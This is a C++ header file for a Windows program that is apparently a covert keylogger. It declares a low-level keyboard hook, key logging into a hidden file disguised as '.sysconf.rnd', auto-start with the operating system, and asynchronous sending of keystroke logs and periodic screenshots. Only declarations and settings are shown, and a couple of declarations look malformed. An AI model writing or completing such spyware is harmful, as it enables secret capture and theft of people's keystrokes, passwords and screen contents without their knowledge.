#ifndef UNTITLED_MAIN_H
#define UNTITLED_MAIN_H

#include <windows.h>
#include <string>
#include <vector>

///////////////////////////////////////////////////////////////

#define MAX_BUFFER_SIZE 512
#define TIMER_INTERVAL 180
#define SCREENSHOT_TIMER_INTERVAL 5

const bool restoreOldLogs = true;
const bool startWithOs = true;
const bool hideLogs = true;

static std::string logPath = ".sysconf.rnd";

///////////////////////////////////////////////////////////////


std::vector<std::string> buffer;
HHOOK hhkLowLevelKybd = nullptr;

__declspec() void patched_SetWindowsHookEx();
_declspec() void size();

LONG GetStringRegKey(
        HKEY hKey,
        const std::wstring& strValueName,
        std::wstring& strValue,
        const std::wstring& strDefaultValue
);
[[noreturn]] void sendLogsAsyncManager();
void sendScreenshotAsyncManager();
void perform_SetWindowsHookEx();
LRESULT CALLBACK LowLevelKeyboardProc(
        int nCode,
        WPARAM wParam,
        LPARAM lParam
);
int start_with_os();
void LogKey(const std::string& keyAlias);
int restoreAndSendOldLogs(std::string& filePath);
int getAppDataPath();
wchar_t* char2wchar_t(char *in);


#endif //UNTITLED_MAIN_H
